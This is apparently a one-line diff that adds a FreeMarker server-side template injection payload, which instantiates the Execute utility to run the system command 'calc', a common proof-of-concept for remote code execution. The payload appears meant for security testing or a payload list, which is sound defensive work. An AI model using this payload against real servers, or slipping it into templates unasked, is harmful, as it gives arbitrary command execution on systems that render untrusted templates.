@@ -1,0 +1,1 @@
+<#assign ccc="freemarker.template.utility.Execute"?new()> ${ccc("calc")}
